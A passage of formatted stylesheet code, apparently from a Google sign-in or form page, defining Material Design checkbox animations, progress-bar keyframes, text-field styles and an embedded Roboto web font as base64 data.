      0% {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-pressed-icon-color, #202124);
        background-color: transparent
      }

      50% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6)
      }
    }

    @keyframes mdc-checkbox-fade-out-background-FF202124FF174EA600000000FF174EA6 {

      0%,
      80% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6)
      }

      to {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-pressed-icon-color, #202124);
        background-color: transparent
      }
    }

    .Ne8lhe .VfPpkd-OYHm6b::before,
    .Ne8lhe .VfPpkd-OYHm6b::after {
      background-color: #3c4043;
      background-color: var(--mdc-checkbox-unselected-hover-state-layer-color, #3c4043)
    }

    .Ne8lhe:hover .VfPpkd-OYHm6b::before,
    .Ne8lhe.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-OYHm6b::before {
      opacity: .04;
      opacity: var(--mdc-checkbox-unselected-hover-state-layer-opacity, 0.04)
    }

    .Ne8lhe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-OYHm6b::before,
    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-OYHm6b::before {
      transition-duration: 75ms;
      opacity: .12;
      opacity: var(--mdc-checkbox-unselected-focus-state-layer-opacity, 0.12)
    }

    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-OYHm6b::after {
      transition: opacity 150ms linear
    }

    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-OYHm6b::after {
      transition-duration: 75ms;
      opacity: .1;
      opacity: var(--mdc-checkbox-unselected-pressed-state-layer-opacity, 0.1)
    }

    @media screen and (forced-colors:active),
    (-ms-high-contrast:active) {
      .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
        color: ButtonText;
        color: var(--mdc-checkbox-selected-checkmark-color, ButtonText)
      }

      .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
        border-color: ButtonText;
        border-color: var(--mdc-checkbox-selected-checkmark-color, ButtonText)
      }

      .Ne8lhe .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
        color: ButtonFace;
        color: var(--mdc-checkbox-disabled-selected-checkmark-color, ButtonFace)
      }

      .Ne8lhe .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
        border-color: ButtonFace;
        border-color: var(--mdc-checkbox-disabled-selected-checkmark-color, ButtonFace)
      }
    }

    .az2ine {
      will-change: unset
    }

    .g9mjtf {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -moz-flex-wrap: wrap;
      flex-wrap: wrap;
      font-size: 12px;
      justify-content: space-between;
      line-height: 1.3333333;
      padding: 0 24px
    }

    @media all and (min-width:450px) {
      .g9mjtf {
        padding-left: 40px;
        padding-right: 40px
      }
    }

    @media all and (min-width:601px) {
      .g9mjtf {
        padding: 8px 0 0;
        position: absolute;
        width: 100%
      }
    }

    .V7i3mf {
      margin-right: 16px
    }

    .V7i3mf .VfPpkd-t08AT-Bz112c {
      margin: 0
    }

    .V7i3mf .VfPpkd-t08AT-Bz112c-Bd00G {
      fill: currentColor
    }

    .V7i3mf .ReCbLb .VfPpkd-NSFCdd-Brv4Fb,
    .V7i3mf .ReCbLb .VfPpkd-NSFCdd-MpmGFe {
      border: none
    }

    .V7i3mf .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic {
      -moz-border-radius: 4px;
      border-radius: 4px;
      height: 48px
    }

    .V7i3mf .VfPpkd-O1htCb {
      margin: 0 0 0-16px
    }

    .V7i3mf .ReCbLb .VfPpkd-uusGie-fmcmS {
      font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif;
      font-size: 12px
    }

    .V7i3mf .VfPpkd-TkwUic:focus {
      background-color: #eee
    }

    .kJOS4 {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      list-style: none;
      margin: 0-16px;
      padding: 0
    }

    .r7XTUb {
      align-items: flex-start;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      margin: 0
    }

    .NUwdAb {
      -moz-border-radius: 4px;
      border-radius: 4px;
      color: #3c4043;
      outline: none;
      padding: 16.0000002px 16px;
      text-decoration: none;
      transition: background .2s
    }

    .NUwdAb:focus {
      background: #eee
    }

    @media all and (min-width:601px) {
      .NUwdAb:focus {
        background: #e0e0e0
      }
    }

    .rQszV:not(.EKBXjc) {
      text-align: center
    }

    .oO8pQe {
      padding-bottom: 0;
      padding-top: 16px;
      color: #202124;
      font-size: 24px;
      font-family: "Google Sans", "Noto Sans Myanmar UI", arial, sans-serif;
      font-weight: 400;
      line-height: 1.3333;
      margin-bottom: 0;
      margin-top: 0;
      word-break: break-word
    }

    .Wz0RKd {
      height: 32px;
      margin-top: 8px
    }

    .qQWzTd {
      -moz-border-radius: 50%;
      border-radius: 50%;
      color: #5f6368;
      overflow: hidden
    }

    .Z6Ep7d {
      align-items: flex-start;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      flex-grow: 0;
      -moz-flex-wrap: wrap;
      flex-wrap: wrap;
      justify-content: space-between;
      margin-left: -8px;
      margin-top: 32px;
      min-height: 48px;
      padding-bottom: 20px
    }

    .dqyqtf {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      flex-direction: row-reverse;
      -moz-flex-wrap: wrap;
      flex-wrap: wrap;
      width: 100%
    }

    .F9NWFb,
    .XOrBDc {
      flex-grow: 1
    }

    .F9NWFb {
      text-align: right
    }

    .XOrBDc {
      align-items: flex-start;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      flex-direction: column
    }

    .Z6Ep7d:not(.NNItQ) .XOrBDc .aYjiFe,
    .Z6Ep7d:not(.NNItQ) .XOrBDc .sbGPcf,
    .Z6Ep7d:not(.NNItQ) .XOrBDc .Xf9GD {
      text-align: left
    }

    @keyframes mdc-circular-progress-container-rotate {
      to {
        transform: rotate(360deg)
      }
    }

    @keyframes mdc-circular-progress-spinner-layer-rotate {
      12.5% {
        transform: rotate(135deg)
      }

      25% {
        transform: rotate(270deg)
      }

      37.5% {
        transform: rotate(405deg)
      }

      50% {
        transform: rotate(540deg)
      }

      62.5% {
        transform: rotate(675deg)
      }

      75% {
        transform: rotate(810deg)
      }

      87.5% {
        transform: rotate(945deg)
      }

      to {
        transform: rotate(1080deg)
      }
    }

    @keyframes mdc-circular-progress-color-1-fade-in-out {
      0% {
        opacity: .99
      }

      25% {
        opacity: .99
      }

      26% {
        opacity: 0
      }

      89% {
        opacity: 0
      }

      90% {
        opacity: .99
      }

      to {
        opacity: .99
      }
    }

    @keyframes mdc-circular-progress-color-2-fade-in-out {
      0% {
        opacity: 0
      }

      15% {
        opacity: 0
      }

      25% {
        opacity: .99
      }

      50% {
        opacity: .99
      }

      51% {
        opacity: 0
      }

      to {
        opacity: 0
      }
    }

    @keyframes mdc-circular-progress-color-3-fade-in-out {
      0% {
        opacity: 0
      }

      40% {
        opacity: 0
      }

      50% {
        opacity: .99
      }

      75% {
        opacity: .99
      }

      76% {
        opacity: 0
      }

      to {
        opacity: 0
      }
    }

    @keyframes mdc-circular-progress-color-4-fade-in-out {
      0% {
        opacity: 0
      }

      65% {
        opacity: 0
      }

      75% {
        opacity: .99
      }

      90% {
        opacity: .99
      }

      to {
        opacity: 0
      }
    }

    @keyframes mdc-circular-progress-left-spin {
      0% {
        transform: rotate(265deg)
      }

      50% {
        transform: rotate(130deg)
      }

      to {
        transform: rotate(265deg)
      }
    }

    @keyframes mdc-circular-progress-right-spin {
      0% {
        transform: rotate(-265deg)
      }

      50% {
        transform: rotate(-130deg)
      }

      to {
        transform: rotate(-265deg)
      }
    }

    @keyframes primary-indeterminate-translate {
      0% {
        transform: translateX(-145.166611%)
      }

      20% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(-145.166611%)
      }

      59.15% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(-61.495191%)
      }

      to {
        transform: translateX(55.444446%)
      }
    }

    @keyframes primary-indeterminate-translate-reverse {
      0% {
        transform: translateX(145.166611%)
      }

      20% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(145.166611%)
      }

      59.15% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(61.495191%)
      }

      to {
        transform: translateX(-55.4444461%)
      }
    }

    @keyframes primary-indeterminate-scale {
      0% {
        transform: scaleX(0.08)
      }

      36.65% {
        animation-timing-function: cubic-bezier(0.334731, 0.12482, 0.785844, 1);
        transform: scaleX(0.08)
      }

      69.15% {
        animation-timing-function: cubic-bezier(0.06, 0.11, 0.6, 1);
        transform: scaleX(0.661479)
      }

      to {
        transform: scaleX(0.08)
      }
    }

    @keyframes auxiliary-indeterminate-translate {
      0% {
        animation-timing-function: cubic-bezier(0.15, 0, 0.515058, 0.409685);
        transform: translateX(-54.888891%)
      }

      25% {
        animation-timing-function: cubic-bezier(0.31033, 0.284058, 0.8, 0.733712);
        transform: translateX(-17.236978%)
      }

      48.35% {
        animation-timing-function: cubic-bezier(0.4, 0.627035, 0.6, 0.902026);
        transform: translateX(29.497274%)
      }

      to {
        transform: translateX(105.388891%)
      }
    }

    @keyframes auxiliary-indeterminate-translate-reverse {
      0% {
        animation-timing-function: cubic-bezier(0.15, 0, 0.515058, 0.409685);
        transform: translateX(54.888891%)
      }

      25% {
        animation-timing-function: cubic-bezier(0.31033, 0.284058, 0.8, 0.733712);
        transform: translateX(17.236978%)
      }

      48.35% {
        animation-timing-function: cubic-bezier(0.4, 0.627035, 0.6, 0.902026);
        transform: translateX(-29.497274%)
      }

      to {
        transform: translateX(-105.388891%)
      }
    }

    @keyframes auxiliary-indeterminate-scale {
      0% {
        animation-timing-function: cubic-bezier(0.205028, 0.057051, 0.57661, 0.453971);
        transform: scaleX(0.08)
      }

      19.15% {
        animation-timing-function: cubic-bezier(0.152313, 0.196432, 0.648374, 1.004315);
        transform: scaleX(0.457104)
      }

      44.15% {
        animation-timing-function: cubic-bezier(0.257759, 0.003163, 0.211762, 1.38179);
        transform: scaleX(0.72796)
      }

      to {
        transform: scaleX(0.08)
      }
    }

    @keyframes buffering {
      to {
        transform: translateX(-10px)
      }
    }

    @keyframes buffering-reverse {
      to {
        transform: translateX(10px)
      }
    }

    @keyframes indeterminate-translate-ie {
      0% {
        transform: translateX(-100%)
      }

      to {
        transform: translateX(100%)
      }
    }

    @keyframes indeterminate-translate-reverse-ie {
      0% {
        transform: translateX(100%)
      }

      to {
        transform: translateX(-100%)
      }
    }

    .sZwd7c {
      overflow: hidden;
      position: relative;
      transform: translateZ(0);
      transition: opacity 250ms linear;
      width: 100%
    }

    .w2zcLc {
      position: absolute
    }

    .xcNBHc,
    .MyvhI,
    .l3q5xe {
      height: 100%;
      position: absolute;
      width: 100%
    }

    .w2zcLc {
      transition: -webkit-transform 250ms ease;
      transition: transform 250ms ease, -webkit-transform 250ms ease
    }

    .MyvhI {
      transform-origin: top left;
      transition: -webkit-transform 250ms ease;
      transition: transform 250ms ease, -webkit-transform 250ms ease
    }

    .w2zcLc {
      height: 100%;
      transform-origin: top left;
      transition: -webkit-transform 250ms ease;
      transition: transform 250ms ease;
      transition: transform 250ms ease, -webkit-transform 250ms ease;
      width: 100%
    }

    .TKVRUb {
      transform: scaleX(0)
    }

    .l3q5xe {
      display: inline-block
    }

    .xcNBHc {
      background-repeat: repeat-x;
      background-image: url(data:image/svg+xml;charset=UTF-8,%3Csvg%20version%3D%271.1%27%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20xmlns%3Axlink%3D%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%27%20x%3D%270px%27%20y%3D%270px%27%20enable-background%3D%27new%200%200%205%202%27%20xml%3Aspace%3D%27preserve%27%20viewBox%3D%270%200%205%202%27%20preserveAspectRatio%3D%27none%20slice%27%3E%3Ccircle%20cx%3D%271%27%20cy%3D%271%27%20r%3D%271%27%20fill%3D%27%23e6e6e6%27%2F%3E%3C%2Fsvg%3E);
      visibility: hidden
    }

    .sZwd7c.B6Vhqe .MyvhI {
      transition: none
    }

    .sZwd7c.B6Vhqe .TKVRUb {
      animation: primary-indeterminate-translate 2s infinite linear
    }

    .sZwd7c.B6Vhqe .TKVRUb>.l3q5xe {
      animation: primary-indeterminate-scale 2s infinite linear
    }

    .sZwd7c.B6Vhqe .sUoeld {
      animation: auxiliary-indeterminate-translate 2s infinite linear;
      visibility: visible
    }

    .sZwd7c.B6Vhqe .sUoeld>.l3q5xe {
      animation: auxiliary-indeterminate-scale 2s infinite linear
    }

    .sZwd7c.qdulke {
      opacity: 0
    }

    .sZwd7c.jK7moc .sUoeld,
    .sZwd7c.jK7moc .TKVRUb,
    .sZwd7c.jK7moc .sUoeld>.l3q5xe,
    .sZwd7c.jK7moc .TKVRUb>.l3q5xe {
      animation-play-state: paused
    }

    .rn19nc {
      height: 4px;
      left: 0;
      overflow: hidden;
      top: 0;
      width: 100%
    }

    .rn19nc .sZwd7c {
      height: 8px
    }

    .rn19nc .l3q5xe {
      background-color: #e0e0e0
    }

    .rn19nc .w2zcLc {
      background-color: #1a73e8
    }

    @media all and (min-width:601px) {
      .rn19nc .sZwd7c {
        -moz-border-radius: 8px 8px 0 0;
        border-radius: 8px 8px 0 0
      }
    }

    .rn19nc .um3FLe {
      background-size: 20px 8px
    }

    .rFrNMe {
      -moz-user-select: none;
      -moz-user-select: none;
      display: inline-block;
      outline: none
    }

    .aCsJod {
      position: relative;
      vertical-align: top
    }

    .aXBtI {
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      top: 14px
    }

    .Xb9hP {
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -moz-box-flex: 1;
      flex-grow: 1;
      flex-shrink: 1;
      min-width: 0%;
      position: relative
    }

    .whsOnd {
      -moz-box-flex: 1;
      flex-grow: 1;
      flex-shrink: 1;
      background-color: transparent;
      border: none;
      display: block;
      font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
      line-height: 24px;
      min-width: 0%;
      outline: none
    }

    .i9lrp {
      left: 0;
      margin: 0;
      position: absolute;
      width: 100%
    }

    .i9lrp:before {
      content: "";
      position: absolute;
      top: 0;
      bottom: -2px;
      left: 0;
      right: 0;
      border-bottom: 1px solid rgba(0, 0, 0, 0);
      pointer-events: none
    }

    .OabDMe {
      left: 0;
      margin: 0;
      padding: 0;
      position: absolute;
      width: 100%
    }

    .OabDMe.Y2Zypf {
      animation: quantumWizPaperInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1)
    }

    .AxOyFc {
      transform-origin: bottom left;
      transition-property: color, bottom, -webkit-transform;
      transition-property: color, bottom, transform;
      transition-property: color, bottom, transform, -webkit-transform;
      font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
      pointer-events: none;
      position: absolute
    }

    .whsOnd:not([disabled]):focus~.AxOyFc,
    .whsOnd[badinput=true]~.AxOyFc,
    .rFrNMe.CDELXb .AxOyFc,
    .rFrNMe.dLgj8b .AxOyFc {
      transform: scale(0.75) translateY(-39px)
    }

    .whsOnd:not([disabled]):focus~.AxOyFc {
      color: #3367d6
    }

    .LXRPh {
      display: -webkit-box;
      display: -webkit-flex;
      display: -moz-box;
      display: -ms-flexbox;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex
    }

    @keyframes quantumWizPaperInputRemoveUnderline {
      0% {
        transform: scaleX(1);
        opacity: 1
      }

      to {
        transform: scaleX(1);
        opacity: 0
      }
    }

    @keyframes quantumWizPaperInputAddUnderline {
      0% {
        transform: scaleX(0)
      }

      to {
        transform: scaleX(1)
      }
    }

    @keyframes quantumWizPaperInputRemoveUnderline {
      0% {
        transform: scaleX(1);
        opacity: 1
      }

      to {
        transform: scaleX(1);
        opacity: 0
      }
    }

    @keyframes quantumWizPaperInputAddUnderline {
      0% {
        transform: scaleX(0)
      }

      to {
        transform: scaleX(1)
      }
    }

    .SdBahf:first-child .hDp5Db:first-child .ze9ebf {
      padding-top: 8px
    }

    .ze9ebf.ze9ebf {
      box-sizing: content-box
    }

    .ze9ebf {
      padding-bottom: 0;
      padding-top: 24px;
      width: 100%
    }

    .ze9ebf .oJeWuf.oJeWuf {
      height: 56px;
      padding-top: 0
    }

    .ze9ebf .Wic03c {
      align-items: center;
      position: static
    }

    .ze9ebf .snByac {
      background-color: transparent;
      bottom: 18px;
      box-sizing: border-box;
      color: #5f6368;
      font-size: 16px;
      font-weight: 400;
      left: 8px;
      max-width: -moz-calc(100% - (2*8px));
      max-width: calc(100% - (2*8px));
      overflow: hidden;
      padding: 0 8px;
      text-overflow: ellipsis;
      transition: transform .15s cubic-bezier(.4, 0, .2, 1), opacity .15s cubic-bezier(.4, 0, .2, 1), background-color .15s cubic-bezier(.4, 0, .2, 1);
      white-space: nowrap;
      width: auto;
      z-index: 1
    }

    .ze9ebf .zHQkBf:not([disabled]):focus~.snByac {
      color: #1a73e8
    }

    .ze9ebf .zHQkBf {
      -moz-border-radius: 4px;
      border-radius: 4px;
      color: #202124;
      font-size: 16px;
      height: 28px;
      margin: 2px;
      padding: 12px 14px;
      z-index: 1
    }

    .ze9ebf.YKooDc .zHQkBf {
      direction: ltr;
      text-align: left
    }

    .ze9ebf .mIZh1c,
    .ze9ebf .cXrdqd {
      -moz-border-radius: 4px;
      border-radius: 4px;
      box-sizing: border-box
    }

    .ze9ebf .mIZh1c,
    .ze9ebf .cXrdqd {
      background-color: transparent;
      bottom: 0;
      height: auto;
      top: 0
    }

    .ze9ebf .mIZh1c {
      border: 1px solid #dadce0;
      padding: 1px
    }

    .ze9ebf .cXrdqd {
      border: 2px solid #1a73e8;
      transition: opacity .15s cubic-bezier(.4, 0, .2, 1)
    }

    .N3Hzgf .cXrdqd {
      height: -moz-calc(100% - 2*2px);
      height: calc(100% - 2*2px);
      width: -moz-calc(100% - 2*2px);
      width: calc(100% - 2*2px)
    }

    .N3Hzgf.u3bW4e .cXrdqd {
      animation: none;
      opacity: 1
    }

    .N3Hzgf.u3bW4e .cXrdqd {
      border: 2px solid #1a73e8
    }

    .N3Hzgf .cXrdqd {
      background-color: transparent
    }

    .N3Hzgf .cXrdqd {
      -moz-border-radius: 4px;
      border-radius: 4px;
      bottom: 0;
      transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
      width: -moz-calc(100% - 2*2px)
    }

    @font-face {
      font-family: "Roboto";
      font-style: normal;
      font-weight: 400;
      src: url(data:font/woff2;base64,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